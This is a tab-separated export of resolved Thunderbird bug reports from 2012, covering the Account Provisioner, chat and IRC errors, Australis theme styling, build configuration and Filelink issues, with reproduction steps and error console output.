758747%TAB%1337942927%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Compose window is broken with Personas%TAB%Compose window is broken with PersonasTimestamp: 05/25/2012 09:43:33 PM Error: TypeError: footer is null Source File: resource:///modules/LightweightThemeConsumer.jsm Line: 60  This may be related to the fact that I'm unable to use the Insert and Format menu entries.  When we initially checked in support for personas in the composition window, I remember struggling with a similar error. The reason was accessing a XBL binding at script load-time (not page load-time). It would trigger evaluation of all XBL bindings, thus triggering the Persona code before the page DOM was complete.  The XBL binding was simply gComposeBundle, which was queried at script load-time. Maybe someone reintroduced this by accident?
758707%TAB%1337937971%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%Account Provisioner checkboxes should be disabled while search in progress%TAB%Account Provisioner checkboxes should be disabled while search in progressSTR:  1. Go to File > New > Get a New Mail Account 2. Enter a name, and start the search  What happens?  While the search occurs, the checkboxes to choose providers are still enabled, meaning the user can toggle them. This has the added defect of *re-enabling* the search button, which allows the user to trigger a second search in parallel to the first.  What's expected?  The UI should be locked down (with the exception of closing the window) while the search is in progress. So we should disable those checkboxes.
758626%TAB%1337925283%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%account provisioner: cannot subscribe a new email address if there an account provisioner tab already open%TAB%account provisioner: cannot subscribe a new email address if there an account provisioner tab already openSTR:  - Select a suggestion in account provisionner suggestion list -> an account provisionner tab opens - File/New/Get a new email address... get a suggestion list - select a suggestion - suggestion list dlg window does not disappear (beach ball), already opened account provisioner tab is not updated (or no new tab is opened for new suggestion)
758618%TAB%1337924467%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%Account provionner: disable search button if no providers are listed%TAB%Account provionner: disable search button if no providers are listedIn languages where there are no default search providers, users can press 'Search' and get an error.   The 'Search' button should be disabled if  - no search providers are selected  - or none are displayed
758478%TAB%1337877389%TAB%130269%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%TestMailCookie is linked with C compiler instead of C++ compiler%TAB%TestMailCookie is linked with C compiler instead of C++ compilerBecause the Makefile.in only has SIMPLE_PROGRAMS=TestMailCookie$(BIN_SUFFIX), C compiler is used as linker.  The file uses C++ libraries, so it will fail on linking.  Add CPPSRCS will solve the problem.
758328%TAB%1337854918%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Build Config%TAB%Port changes to allow automatic signing of Thunderbird builds%TAB%Port changes to allow automatic signing of Thunderbird buildsBug 730328 is implementing automatic signing of builds for Thunderbird. We need to port the build config changes that are part of this.  Rail has already done this, moving the patch here so we've got the necessary tracking flags.  It has r=me.
758237%TAB%1337842612%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%Account Provisioner tab should close and respawn AP dialog if provider XML is corrupt or returns error%TAB%Account Provisioner tab should close and respawn AP dialog if provider XML is corrupt or returns errorSTR:  1)  Go to File > New > Get a New Mail Account 2)  Make sure Hover.com is selected, and fill in a name 3)  Choose an address and fill in the form 4)  If there is no credit card field, press "Continue", and the field should reveal itself. Fill the credit card field with a valid credit card number  (it will not be charged) and press "Continue".   5)  Choose to "Cancel this order"  What happens?  A big ugly XML page is displayed to the user.  What's expected?  The tab should close, and we should go back to the Account Provisioner dialog.
757825%TAB%1337747225%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Chat UI not correctly hidden on existing profiles%TAB%Chat UI not correctly hidden on existing profilesI had a report on IRC that on Tb13b2 with an existing profile the "Tools -> Chat Status" and "Go -> Chat" menu items weren't hidden.  There was this error in the error console:  Error: document.getElementById(aId) is null Line 683 File: chat-messenger-overlay.js http://mxr.mozilla.org/comm-beta/source/mail/components/im/content/chat-messenger-overlay.js#683  The same problem didn't happen with a fresh profile.  I suspect for some reason the Chat button wasn't present in the toolbar. A trivial fix seems to just add a null check before attempting to hide an element.
757823%TAB%1337746884%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%Make Account Provisioner order-form content tab handle and display links%TAB%Make Account Provisioner order-form content tab handle and display linksSTR:  1) Go to File > New > Get a New Mail Account 2) Make sure Hover.com is selected, type in a name, and click "Search" 3) Choose to purchase one of the suggested accounts 4) In the order form tab that opens, try clicking on the "Billing" link  What happens?  The link opens in the default browser, without the session cookie.  What's expected?  We want to allow the user to open certain links from within Thunderbird, since their session cookie is needed in order for the link to do its job.   From Pete Brevin at the Hover team:  "...links in our HTML always open in a new browser window (without the Thunderbird session cookie).  We'd like a way to make some of them, such as "return to billing info" or "cancel this order", be handled by Thunderbird, otherwise the user experience is horribly disconnected."  Blake - attaching a click handler shouldn't be too hard, but where do we draw a distinction between which links to open in content, and which to open in browser?  Or should we just have a blanket policy of opening URLs within the provider domain within content, like webSearchTab?
757031%TAB%1337576616%TAB%99100%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%On new profile I see a big scary red message when the account provisioner window show up%TAB%On new profile I see a big scary red message when the account provisioner window show upSTR, new profile launch Tb I've noticed that on b1 on first launch I get a nice "Sorry - we're unable to communicate with our sign-up server. Please check your connection." Big red error messages .  Error console says :  Timestamp: 21/05/12 11:44:06 Error: self.searchEnabled is not a function Source File: chrome://messenger/content/newmailaccount/accountProvisioner.js Line: 498
756239%TAB%1337253641%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%YouSendIt password prompt focuses compose windows by default%TAB%YouSendIt password prompt focuses compose windows by defaultSTR:  1)  Open a compose window 2)  Open up the preferences dialog, and choose to create a new YouSendIt account  What happens?  When the password prompt for YouSendIt comes up, it attaches itself to the compose window, which brings the compose window into focus.  What's expected?  YouSendIt's password prompt should attach to the front-most window, in this case.
756136%TAB%1337241299%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%not possible to see if the left pane of the Chat tab has focus if "Conversations" is selected on Windows/Linux%TAB%not possible to see if the left pane of the Chat tab has focus if "Conversations" is selected on Windows/LinuxJb noticed that on Linux it's impossible to see if the left pane (the listbox) of the Chat tab has focus when the "Conversations" item is selected. I looked at the code and it seems that's broken on Windows too.  The attached patch should make that list look the list of folders of the Mail 3pane view for Windows and Linux.  This bug makes the changes I did in bug 740765 difficult to understand/discover.
755988%TAB%1337190165%TAB%442436%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Mail Account Setup doesn't detect service on smtps (465)%TAB%Mail Account Setup doesn't detect service on smtps (465)User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20120515 Firefox/14.0a2 Build ID: 20120515042006  Steps to reproduce:  User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20120516 Thunderbird/14.0a2  I noticed that "Mail Account Setup" wizard cannot detect service running on port 465 with SSL/TLS.  I found the problem with version 12.0.1 (for Windows and Mac).  I tried Earlybird (14.0a2) for Windows but it was still broken.  I did the following steps: (Assume an (internal) SMTP server running services on standard port 25/465/587)  * Select Account Settings -> Account Actions -> Add Mail Account * Enter a name and Email address, and click "Continue" * Thunderbird found configuration by trying common server names * Click "Manual config" and change outgoing SSL setting from "STARTTLS" to "SSL/TLS"   (The port number was automatically changed from 587 to 465) * Click "Re-test"   Actual results:  Thunderbird reported "Thunderbird failed to find the settings for your email account".  If I reverted outgoing SSL setting to "STARTTLS" and clicked "Re-test", Thunderbird reported "The following settings were found by probing the given server".  I'm sure that the server is configured correctly, because I could manually edit "Outgoing Server (SMTP)" in Account Settings to use "SSL/TLS" for "Connection security" and send messages without problems.   Expected results:  Thunderbird should be able to find service on port 465 with SSL/TLS by probing the given server. Actually, version 9.0.1 worked as expected, so it is a regression.  I captured packets between the client and server using wireshark, and noticed that Thunderbird didn't send SSL client hello to port 465 after 3-way handshake, and just closed the connection.  imaps (993) and pop3s (995) are detected properly. I guess something is wrong with the service detection logic.
755968%TAB%1337181901%TAB%132034%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Clarify text on button that restarts/updates%TAB%Clarify text on button that restarts/updatesCurrently, the button in the About window shows "Apply Update" when an update is ready to install.  Let's change this to say "Restart to Update" instead, which synchronizes with Firefox.
755793%TAB%1337153659%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%Allow for drawing in the window titlebar for Australis%TAB%Allow for drawing in the window titlebar for AustralisBasically, for Australis we want to be able to draw in the window titlebar, so that we can do away with the window icon / title, and move our tabs into the freed real-estate.
755760%TAB%1337149434%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Theme%TAB%Australis - taller toolbar%TAB%Australis - taller toolbarThe toolbar needs to be taller in order to match the mockup [1]. Currently the buttons are almost touching the borders.  1. http://25.media.tumblr.com/tumblr_m0iwtyy6nh1qkoea4o1_1280.png
755754%TAB%1337148703%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Australis - quickfilter toolbar styling%TAB%Australis - quickfilter toolbar stylingIt would be desirable to match http://24.media.tumblr.com/tumblr_m0it9bMzM51qkoea4o1_1280.png  * No colored icons * The pin needs to be square on selected
755718%TAB%1337142862%TAB%7313%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%There should be an audible notification when new messages are received on IRC%TAB%There should be an audible notification when new messages are received on IRCWhen I receive new messages on IRC specifically to me (private messages or by name), there should be an audio notification.
755632%TAB%1337116254%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Missing source-upload, hg-bundle and l10n-check targets%TAB%Missing source-upload, hg-bundle and l10n-check targetsThe new release automation requires the source-upload and hg-bundle targets in the top of the object directory to work properly.  We just need to sync the relevant definitions in the mail build.mk with those in the browser one.
755334%TAB%1337065886%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Errors in the console when there are private IRC conversations%TAB%Errors in the console when there are private IRC conversations[Exception... "'TypeError: aSubject is null' when calling method: [nsIObserver::observe]"  nsresult: "0x8057001c (NS_ERROR_XPC_JS_THREW_JS_OBJECT)"  location: "JS frame :: resource:///modules/jsProtoHelper.jsm :: <TOP_LEVEL> :: line 444"  data: no]  The notification is: aTopic = update-conv-title, aSubject = null It seems to come from: https://hg.mozilla.org/comm-central/annotate/42e874815e9c/chat/protocols/irc/irc.js#l351  I think this is an existing bug of the Tb IM UI that was exposed by https://hg.mozilla.org/comm-central/rev/42e874815e9c#l1.116 that was checked-in as part of bug 753807.
754914%TAB%1336984737%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Highlight the search term in IM conversation search results%TAB%Highlight the search term in IM conversation search results> When I click on an IM search result (in my case, Twitter), it would be nice > to highlight the message that matched somehow.  (Email only shows one > message, so there's less ambiguity as to which one you should be looking at.)  It seemed easy, but I had to change lots of little details that weren't exactly right but were barely noticeable without this in the chat tab. (We were redisplaying the log content and list of logs way too often; which is now very undesirable as it makes the highlighted result disappear.)  Requesting review from Blake, but I would like a confirmation that Andrew doesn't see anything wrong with changing the parameter of the showConversationInTab method in glodaFacetView.js so I requested feedback from Andrew too.  Also, the conversation being displayed asynchronously in chunks makes things more difficult. I had to add setTimeout calls to tell the findbar to find again until the result is found. The only case where these timeouts won't be stopped before the whole conversation has been displayed is if the found search term isn't in the displayed conversation. This shouldn't happen, but it can currently happen because of bug 754824 that I noticed while working on this, and debugged today.
754824%TAB%1336967926%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Search%TAB%The highlight is off by a few characters in the search result view when some characters are UTF8 encoded on 4 bytes%TAB%The highlight is off by a few characters in the search result view when some characters are UTF8 encoded on 4 bytesI noticed this with the <U+1F493> character (http://www.fileformat.info/info/unicode/char/1f493/index.htm). See the attached screenshot.  The cause of the problem is that the current code assumes that an UTF8 character that requires more than 2 bytes is coded on 3 bytes. However, some UTF8 characters are coded on 4 bytes; they are seen by the JS code as 2 separate characters so I assumed at the time I wrote the flawed code that this case would just work, but actually it doesn't because the current code returns 3 bytes for each half of the 4 bytes character, and the character ends up counted as 6 bytes.
754655%TAB%1336870837%TAB%362792%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Images get replaced by placeholder images when saving a message as draft or template multiple times,Out of multiple identical inline images, all but 1st image break (broken image placeholder) when saving a message as draft or template multiple times,Out of multiple identical inline images, all but 1st image break (broken image placeholder) when saving a message as draft or template multiple times (multipart numbering problem)%TAB%Images get replaced by placeholder images when saving a message as draft or template multiple times,Out of multiple identical inline images, all but 1st image break (broken image placeholder) when saving a message as draft or template multiple times,Out of multiple identical inline images, all but 1st image break (broken image placeholder) when saving a message as draft or template multiple times (multipart numbering problem)If you create a new message, insert one image multiple times and save the message multiple times as draft or template, the images get replaced by placeholder images.  1. Create a new message 2. Insert one image multiple times, e.g.: <img src="http://www.mozilla.org/favicon.ico" /> <img src="http://www.mozilla.org/favicon.ico" /> <img src="http://www.mozilla.org/favicon.ico" /> 3. Save the message as draft or template 4. Open the saved message 5. Save the message as draft or template  Now the second image and the third image are replaced by placeholder images in the current editor. (However, opening the saved draft or template again shows the correct images.)  I've tested this with different versions of Thunderbird: This behaviour started in Thunderbird 10. (Using Thunderbird 3.1 up to Thunderbird 9 works without problems.)  Arch Linux / Thunderbird 12.0.1  When inserting the images, can you try to use "Insert -> HTML" and insert the following HTML: <img src="http://www.mozilla.org/favicon.ico" /> <img src="http://www.mozilla.org/favicon.ico" /> <img src="http://www.mozilla.org/favicon.ico" />  So, I guess I missed one step in the description: 1. Create a new message 2. Insert one image multiple times, e.g.: <img src="http://www.mozilla.org/favicon.ico" /> <img src="http://www.mozilla.org/favicon.ico" /> <img src="http://www.mozilla.org/favicon.ico" /> 3. Save the message as draft or template 4. Close the message compose window 5. Open the saved message 6. Save the message as draft or template  And again, the placeholder image does only show in the current editor of the message compose window after you have saved the message as draft the second time. If you close the message compose window afterwards and take a look at the saved message, the original image shows fine.
754564%TAB%1336794043%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Allow only small icons on Aero%TAB%Allow only small icons on AeroThe Aero theme has only one icon size and it makes no sense to allow to switch to big icons. This would only make Add-on icons blurry when in big icon mode and they are forced to a 16px * 16px icon size.
753797%TAB%1336631050%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%YouSendIt password does not get cleared from password manager if it's no longer valid%TAB%YouSendIt password does not get cleared from password manager if it's no longer validSTR:  1)  Create a new YouSendIt Filelink account. When the password prompt comes up, give it something incorrect, but tell it to save the password. 2)  When the authorization error is displayed, click "Set up Account" again  What happens?  The dialog attempts to reauthorize using the saved password, which doesn't give the user a chance to correct it.  What's expected?  If authorization fails, the user's saved password should get wiped out so that we reprompt.
753709%TAB%1336616670%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%JS error when pressing space on a Chat or Gloda facet view tab%TAB%JS error when pressing space on a Chat or Gloda facet view tabJavaScript error: chrome://messenger/content/mailWindowOverlay.js, line 2368: contentWindow is null  This JS error happens at least: - on the Chat tab (when no textbox has the focus) - on the Gloda facet view tab - on chromeTab (which is a bit surprising, given that the method works for contentTab).  The attached patch returns early if the currently selected tab is neither a mail tab nor a contentTab. I'm not sure it's a good solution, but it does fix the noisy JS error. Other possible approaches: - just add a null check on the contentWindow variable - attempt to rewrite the whole function in a way that would make more sense; maybe using the getBrowser method of tabs (I haven't tried this because I'm not sure I fully understand the current code; it took me a while to understand what the _mailrssiframe stuff was, it seemed like dead code at first).
753691%TAB%1336610694%TAB%160105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Changing nick doesn't change name in new messages in conversation pane%TAB%Changing nick doesn't change name in new messages in conversation paneWhen you change your nick in an IRC session and type a new message, the message shows up in the conversation pane with the old nick or maybe the nick that is defined in your account, not with the nick that is set...
753690%TAB%1336610090%TAB%160105%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Unhandled IRC messages in Error Console,Unhandled IRC messages from WHOIS: 378, 307 and 671%TAB%Unhandled IRC messages in Error Console,Unhandled IRC messages from WHOIS: 378, 307 and 671When I login to an irc channel or hover a name from the participants list in the Chat tab, I get some messages in my error console:  Timestamp: 10-5-2012 11:27:45 Warning: Unhandled IRC message: :gravel.mozilla.org 378 nONoNonO nONoNonO :is connecting from *@a168-15.amc.nl 145.117.168.15 Source File: resource:///components/irc.js Line: 334 Source Code: irc  Timestamp: 10-5-2012 11:27:45 Warning: Unhandled IRC message: :gravel.mozilla.org 307 nONoNonO nONoNonO :is a registered nick Source File: resource:///components/irc.js Line: 334 Source Code: irc  Timestamp: 10-5-2012 11:27:45 Warning: Unhandled IRC message: :gravel.mozilla.org 671 nONoNonO nONoNonO :is using a Secure Connection Source File: resource:///components/irc.js Line: 334 Source Code: irc
753478%TAB%1336559194%TAB%101158%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%large icon versions in qute/mail/messageHeader.css not used and should be removed%TAB%large icon versions in qute/mail/messageHeader.css not used and should be removedThe rules for large versions of the icons in qute/mail/messageHeader.css is redundant, since we always use small icons. Someone should clean out those...  For instance  309 .hdrReplyAllButton { 310   list-style-image: url("chrome://messenger/skin/icons/mail-toolbar.png"); 311   -moz-image-region: rect(0px 120px 24px 96px); 312 } 313  314 toolbar[iconsize="small"] .hdrReplyAllButton { 315   list-style-image: url("chrome://messenger/skin/icons/mail-toolbar-small.png"); 316   -moz-image-region: rect(0px 80px 16px 64px); 317 }  Here the first block is not used.
752867%TAB%1336444937%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%Support disabling of what's new prompts via the update server snippets%TAB%Support disabling of what's new prompts via the update server snippetsFirefox has a mechanism (implemented in bug 538331) so that it is an update-generation time decision as to whether or not to push a what's new page for a particular release.  With the new automation switch-over, Thunderbird will also gain the necessary update server support for this and we already know this is something that we want to have.  The bulk of this appears to be porting the checks in Firefox's nsBrowserContentHandler.js / getPostUpdateOverridePage function to an appropriate place in Thunderbird.  We can then use that to control showing the what's new page in specialTabs.js / openSpecialTabsOnStartup.  We should also redirect the what's new help menu item like we did in bug 746320.
752618%TAB%1336384095%TAB%339434%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%Send country code to email provider, to allow for different pricing and currency conversion.%TAB%Send country code to email provider, to allow for different pricing and currency conversion.One of the email account providers we're talking to has different suggestions and prices for different countries, and so would need to take the user's country into account when offering suggestions.  Assigning to sancus, because he's the person who will need to implement it.  CCing Sid, because it's more user data that we'll be sending to the (user-selected) providers, and so it should probably get a privacy-once-over.
752347%TAB%1336296060%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Alltabs graphic is displayed in the wrong vertical orientation%TAB%Alltabs graphic is displayed in the wrong vertical orientationWith tabs on top the hanging tab of the alltabs graphic is wrong.
752335%TAB%1336291574%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Lots of Permanent oranges since CPG landed: Test Failure: controller(): Window could not be initialized.%TAB%Lots of Permanent oranges since CPG landed: Test Failure: controller(): Window could not be initialized.Since compartment-per-global landed (bug 650353), some of our Mozmill tests have started to perma-orange with an error stating that:  Test Failure: controller(): Window could not be initialized.  The Mozmill devs themselves got broken by 650353 (see 751424), and they're rapidly working to fix themselves up.  When their patch lands, we'll have to modify our workaround (bug 666438) in _wait_for_generic_load in test-window-helpers.js, but then we should be back in business.  I just tried an early version of the Mozmill patch with a variation on our workaround with positive results.
752306%TAB%1336270637%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Cleanup MessageHeader button min-height definition%TAB%Cleanup MessageHeader button min-height definitionAfter landing of bug 741998 the messageheader buttons don't have the same height in text only mode.
751971%TAB%1336124106%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-about-support.js | test-about-support.js::test_copy_to_clipboard_public test-about-support.js::test_copy_to_clipboard_private%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-about-support.js | test-about-support.js::test_copy_to_clipboard_public test-about-support.js::test_copy_to_clipboard_privateWe're getting errors in these tests, with:  "Test Failure: text is undefined"  being the error message.
751911%TAB%1336114479%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Thunderbird starts in a broken state (unresponsive buttons, no thread / folder pane, etc)%TAB%Thunderbird starts in a broken state (unresponsive buttons, no thread / folder pane, etc)This seems to affect Linux and probably OSX (I'm pretty sure that's where Irving saw it).  My gut tells me that this is likely fallout from bug 650353 - but I'm bisecting to make sure.
751871%TAB%1336104427%TAB%366440%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%General%TAB%After upgrade refuses to start - crashes with "Terminate called without an active exception" in terminal.%TAB%After upgrade refuses to start - crashes with "Terminate called without an active exception" in terminal.User Agent: Mozilla/5.0 (X11; Linux i686; rv:15.0) Gecko/15.0 Firefox/15.0a1 Build ID: 20120503030512  Steps to reproduce:  Installed Thunderbird Daily using this method:  http://andrzejl.no-ip.org:10101/wordpress/2012/04/25/testing-mozilla-thunderbird-central-daily-15-safely-on-pclinuxos-2012-x/  Worked flawlessly as always till today.   Actual results:  I have noticed that there was a update ready to be applied in the Help > About Daily section and so I have applied it. Right after Thunderbird "restarted" itself it crashed and wanted to report error - so I did that. I thought that maybe a full reboot will do it - nope. Application crashes in safe mode too.   Expected results:  Well I really love this part... Uhm... After upgrade Thunderbird should start normally without crashing
751679%TAB%1336042667%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Build Config%TAB%Update AUS server for Thunderbird%TAB%Update AUS server for ThunderbirdAs we're moving across from the old MoMo hardware to the hardware Firefox uses, we need to update the app.update.url appropriately.  aus3.mozilla.org is currently kept up to date by syncing our snippets across from the old server. aus3 is the new one we need to point to.  Hence the old and new will be kept in sync. When we switch the trunk automation, only aus3 will be kept up to date. This means that users on nightlies will need to go to one of the last builds on the old server, and then pick up the url for the new server.  However, once the full migration is complete, we'll redirect the hits to the old aus server direct to aus3, hence it won't then matter which url old users have.  Attached is the patch to change the url, I'm doing final tests at the moment.
751592%TAB%1336028695%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Windows debug builders failing due to error in Root.h / Upgrade to Windows 2010%TAB%Windows debug builders failing due to error in Root.h / Upgrade to Windows 2010Changes in mozilla-central have broken the Windows debug builds with:  e:\builds\moz2_slave\tb-comm-cen-w32-dbg\build\mozilla\js\src\gc/Root.h(303) : fatal error C1075: end of file found before the left brace '{' at 'e:/builds/moz2_slave/tb-comm-cen-w32-dbg/build/mozilla/js/src/jsnum.cpp(1232)' was matched  As we're currently upgrading to the Firefox architecture, the new builders have Visual Studio 2010 installed and if we upgrade to it, then it fixes the build issue.  However, currently it also breaks mozmill tests in debug mode, I'm trying to work out what the opt ones are doing before working out where we go next.
750794%TAB%1335860769%TAB%339203%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Add pref UI to enable do-not-track (DNT) in Thunderbird%TAB%Add pref UI to enable do-not-track (DNT) in ThunderbirdWe should add a pref so users can enable the do-not-track header (DNT) on all outgoing HTTP requests caused by thunderbird.  I'll have a first whack at a patch to create a checkbox in options->Security->Web Content.
750789%TAB%1335860087%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Hide YouSendIt graph / stats if they don't finish their API in time%TAB%Hide YouSendIt graph / stats if they don't finish their API in timeThe YSI v2 API gives us the amount of storage space that a user has been allocated, but does not give us any information about how much storage space a user has used.  YSI is working to fix this.  In the event that they can not finish it in time, we should have a fallback for the YSI management pane.  Blake and I discussed this, and we thought that simply displaying the YSI settings link in the center of the pane would be sufficient.
750691%TAB%1335847511%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-cloudfile-backend-yousendit.js | test-cloudfile-backend-yousendit.js::teardownTest%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-cloudfile-backend-yousendit.js | test-cloudfile-backend-yousendit.js::teardownTestThis has been on our nightly builds for a few days.  Aurora / Beta do not seem to be affected.  Considering that most if not all Filelink patches have simultaneously landed on Aurora and Beta, my guess is that something has changed in mozilla-central to cause this.  Another thing to note is that the test is complaining that the "Dropbox" server is failing to stop.  That's a copy-paste error - it means "YouSendIt".
750669%TAB%1335843106%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Build Config%TAB%Update in-tree mozconfigs for running mac builds on Mac 10.7 based builders%TAB%Update in-tree mozconfigs for running mac builds on Mac 10.7 based buildersFirefox did this a while ago, with the new automation, we want to pick up this work as well.  The mozconfig changes match us against Firefox for the critical parts. I've tested them on a 10.7 builder, and the builds succeeded.
750652%TAB%1335834516%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%MACOSX_DEPLOYMENT_TARGET mismatch when installing mozmill on 10.7 machines%TAB%MACOSX_DEPLOYMENT_TARGET mismatch when installing mozmill on 10.7 machinesThe mac machines that Firefox uses have Python 2.7 which is configured for a MACOSX_DEPLOYMENT_TARGET of 10.7. However, when we come along doing cross-compiles back to 10.5 or 10.6, it complains with:  distutils.errors.DistutilsPlatformError: $MACOSX_DEPLOYMENT_TARGET mismatch: now "10.5" but "10.7" during configure Failure to install virtualenv  As this is just the installation/set-up of virtualenv and that env is going to be run on 10.7 boxes, then I think it is safe to just clear MACOSX_DEPLOYMENT_TARGET - it won't affect the Thunderbird build, and it shouldn't affect the mode the executable is run in, it is just all python stuff.
750491%TAB%1335788854%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Some of the in-tree mozconfigs are missing --skip-comm%TAB%Some of the in-tree mozconfigs are missing --skip-commCurrently this breaks for pulling the repositories on the try server builds. What is happening some of our mozconfigs are missing --skip-comm which the try server then tries to pull but fails.  Attached is the patch to fix this.
749690%TAB%1335515630%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Add a findbar and support the zoom feature in the chat tab%TAB%Add a findbar and support the zoom feature in the chat tabI was mostly interested in adding the findbar as we will want to use it for a follow up to bug 743235, but while looking at how the find commands work in other Thunderbird tabs, I noticed I could get the zoom working almost for free, and as we will want it too anyway, I put both in the same bug and patch.
749613%TAB%1335504370%TAB%62624%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Feed Subscriptions dialog empty after upgrade to v12%TAB%Feed Subscriptions dialog empty after upgrade to v12User Agent: Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0 Build ID: 20120420145725  Steps to reproduce:  Upgraded to Thunderbird v12   Actual results:  The "Feed Subscriptions" dialog stopped showing any feeds (it is empty).  Feeds still exist and can be refreshed, but I have no way to unsubscribe, etc.   Expected results:  The Feed Subscription dialog should have displayed all of my current feeds.
749552%TAB%1335489383%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%The Command+K keyboard shortcut should select for chat search box when the chat tab is selected%TAB%The Command+K keyboard shortcut should select for chat search box when the chat tab is selectedThe empty text of the IM search box shows the Command+K keyboard shortcut (consistent with search boxes of other tabs) so it should work.
748830%TAB%1335339702%TAB%22599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Account Setup Wizard loaded on every startup%TAB%Account Setup Wizard loaded on every startupReproduction: * Enable log4moz logging for module "mail.wizard" * Start Thunderbird (with accounts already set up)  Actual result: Immediately after startup: 2012-04-25 18:36:00     mail.wizard     INFO    Initializing setup wizard 2012-04-25 18:36:00     mail.wizard     INFO    email account setup dialog => JS code of the wizard is loaded No account wizard shows up  Expected result: No account wizard shows up The above log messages don't show No JS code of the wizard is loaded  Impact: Useless processing, slows startup, pointless.
748799%TAB%1335336218%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Extra link inserted into Filelink emails on receiver's end%TAB%Extra link inserted into Filelink emails on receiver's endWhen sending a Filelink email, receivers still see a URL attachment, distinct from the Filelink URL in the body of the message. 
748742%TAB%1335328320%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Drop ccache options from Mac debug mozconfigs and make the mac32 bit mozconfig work properly%TAB%Drop ccache options from Mac debug mozconfigs and make the mac32 bit mozconfig work properlyThe non-10.7 macs haven't got ccache installed, so we should just drop that option.  The Mac 32 debug mozconfig is incorrectly including mozconfig.leopard in a way that won't work, this will correct it, the same as we've done with the other mozconfig files.
748400%TAB%1335251660%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Filelink add account dialog's "Learn More" looks strange when no more accounts can be added.%TAB%Filelink add account dialog's "Learn More" looks strange when no more accounts can be added.Ok, so now the "Learn More..." link is beneath and right aligned with the "You can't add more than one account" text.  I also noticed that the "Set up account" button was still enabled in this state.  We now disable when we're in this state.
